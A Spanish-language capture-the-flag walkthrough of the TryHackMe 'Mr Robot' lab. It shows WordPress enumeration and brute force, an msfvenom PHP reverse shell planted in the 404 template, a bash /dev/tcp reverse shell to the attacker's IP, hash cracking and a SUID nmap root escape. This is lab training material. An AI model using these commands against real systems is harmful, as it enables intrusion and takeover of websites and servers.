# Ejercicio Práctico Maquina Mr Robot CTF – Hacking WordPress + Escalada de Privilegios

Maquinas que vamos a utilizar **Kali Linux y mrrobot**  [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)

```bash
ping -c 1 10.10.192.154
```

![image.png](./imagenes/image.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.10.192.154
```
 
![image.png](./imagenes/image%201.png)

- Miramos el puerto 80 con nuestro navegador web
    
    ![image.png](./imagenes/image%202.png)
    

- Miramos lo que corre por el puerto 443 por donde también hay un servidor web.
    
    ![image.png](./imagenes/image%203.png)
    
    Corre la misma web
    

- Hacemos fuzzing con **gobuster.**
    
    ```bash
    gobuster dir -u http://10.10.192.154/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
    ```
    
    ![image.png](./imagenes/image%204.png)
    
    Vemos que es un WordPress.
    
- Vamos a probar a entrar en **wp-login**.
    
    `http://10.10.192.154/wp-login`
    
    ![image.png](./imagenes/image%205.png)
    
    Imaginemos que sospechamos o adivínanos el **usuario “Elliot”.**
    
    <aside>
    💡
    
    En WordPress en versiones un poco antiguas podemos comprobar si existe ese usuario por el tipo de error que nos genera al introducirlo con una contraseña errónea. 
    
    Si no fuera un usuario existente el error seria el siguiente: “**ERROR: Invalid username. Lost your password?**” → “**ERROR: Usuario no válido. ¿Olvidaste tu contraseña?”**
    
    ![image.png](./imagenes/image%206.png)
    
    Básicamente seria este mensaje en el que se entiende que el usuario existe.
    
    **“ERROR: The password you entered for the username Elliot is incorrect. Lost your password?” → “ERROR: La contraseña que introdujiste para el usuario Elliot es incorrecta. ¿Perdiste tu contraseña?”**
    
    ![image.png](./imagenes/9abe630f-4862-460c-b182-3f0b3fc07dfe.png)
    
    </aside>
    
- Ya que tenemos un nombre de usuario hacemos un ataque de fuerza bruta con **WpScan** ya que **estamos en un WordPress.**
    
    ```bash
    wpscan --url [http://10.10.192.154/wp-login.php](./imagenes/http://10.10.192.154/wp-login.php) --passwords /usr/share/wordlists/rockyou.txt --usernames Elliot
    ```
    
    ![image.png](./imagenes/image%207.png)
    
    En este caso **el ataque de fuerza bruta no funciona**. Debemos investigar por los directorios.
    
    En esta maquina dentro del directorio `/license` que hemos encontrado con gobuster encontramos una línea al final del archivo que nos muestra.
    
    ![image.png](./imagenes/image%208.png)
    
    ![image.png](./imagenes/image%209.png)
    
    `ZWxsaW90OkVSMjgtMDY1Mgo=`
    
    - Es importante **probar** si esta **codificado en base64** de esta manera**:**
        
        ```bash
        echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
        ```
        
        ![image.png](./imagenes/image%2010.png)
        
        Donde estaría el **usuario y la contraseña**: “**elliot:ER28-0652**”
        
- Nos volvemos a **wp-login** y introducimos las credenciales.
    
    ![image.png](./imagenes/image%2011.png)
    

---

- Vamos a ganar acceso a la maquina victima
    - En el menú Izquierdo acedemos a **Appearance  → Editor**
        
        ![image.png](./imagenes/image%2012.png)
        
        ![image.png](./imagenes/image%2013.png)
        
    - En una terminal vamos a crear un Payload **malicioso en php con msfvenom**.
        
        ```bash
        msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > wp.php
        ```
        
        ![image.png](./imagenes/image%2014.png)
        
    - Lo visualizamos y copiamos todo su contenido al portapapeles.
        
        ```bash
        cat pwned.php 
        ```
        
        ![image.png](./imagenes/image%2015.png)
        
    
    - Editamos la platilla por ejemplo la “**404 Template**”. Eliminamos s contenido y pegamos el del archivo malicioso que hemos creado.
        
        ![image.png](./imagenes/image%2016.png)
        
    - En un terminal nos ponemos a la escucha con netcat.
        
        ```bash
        nc -nlvp 443
        ```
        
        ![image.png](./imagenes/image%2017.png)
        
    - Vamos al navegador web y escribimos la siguiente URL `http://10.10.118.131/wp-content/hdkfdskfd`
        
        `/wp-content` - Es la ruta donde se encuentran las plantillas.
        
        `/hdkfdskfd` - Es inventado por que lo que queremos es que nos de un error 404 y nos cargue la plantilla con el código malicioso.
        
        ![image.png](./imagenes/image%2018.png)
        
        ![image.png](./imagenes/image%2019.png)
        
        Ya tenemos la conexión.
        
    - Vamos a **estabilizarla la conexión** y hacer el **tratamiento de la TTY**.
        - Ponemos el puerto 4444 a la escucha
            
            ![image.png](./imagenes/image%2020.png)
            
        - Vamos a la web [https://www.revshells.com/](./imagenes/https://www.revshells.com/)
            
            ![image.png](./imagenes/image%2021.png)
            
            `bash -c "sh -i >& /dev/tcp/10.21.166.149/4444 0>&1"`
            
            Lo pegamos en el escucha del puerto 443
            
            ![image.png](./imagenes/image%2022.png)
            
            Y ya tendríamos una conexión estable en la escucha del puerto 4444.
            
            ![image.png](./imagenes/image%2023.png)
            
        - Hacemos el tratamiento de la TTY
            
            En este caso un tratamiento estándar de la TTY no funciona así que vamos a poner lo siguiente:
            
            `python -c "import pty;pty.spawn('/bin/bash')”`
            
            ![image.png](./imagenes/image%2024.png)
            
    - Nos movemos por los directorios y nos encontramos un archivo llamado **password.raw-md5** en la carpeta **/home/robot.** Miramos en su interior.
        
        `cat password.raw-md5`
        
        ![image.png](./imagenes/image%2025.png)
        
        Vemos que hay una **contraseña hasheada**.
        
    - Utilizaríamos John the Ripper o vamos a la web [https://crackstation.net/](./imagenes/https://crackstation.net/) y introducimos  la contraseña hasheada.
        
        ![image.png](./imagenes/image%2026.png)
        
    
    `abcdefghijklmnopqrstuvwxyz`
    
    - Vamos a cambiarnos de usuario a **usuario rotbot.**
        
        `su robot`
        
        ![image.png](./imagenes/image%2027.png)
        
    
    - Hacemos una escalada de privilegios
        
        `sudo -l`
        
        ![image.png](./imagenes/image%2028.png)
        
        Vemos que no funciona
        
    - Buscamos **binarios SUID.**
        
        `find / -perm -4000 2>/dev/null`
        
        ![image.png](./imagenes/image%2029.png)
        
    
    - Utilizamos la web de [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/) para ver si podemos utilizar alguno y como hacerlo. Por ejemplo  **/usr/local/bin/nmap**
        
        ![image.png](./imagenes/image%2030.png)
        
    - Como TIP En caso de no funcionar echaremos mano a las búsquedas en internet
        
        `nmap privilege escalation suid`
        
        ![image.png](./imagenes/image%2031.png)
        
        ![image.png](./imagenes/image%2032.png)
        
        **Lo probamos:**
        
        `nmap --interactive`
        
        `!sh`
        
        `whoami`
        
        ![image.png](./imagenes/image%2033.png)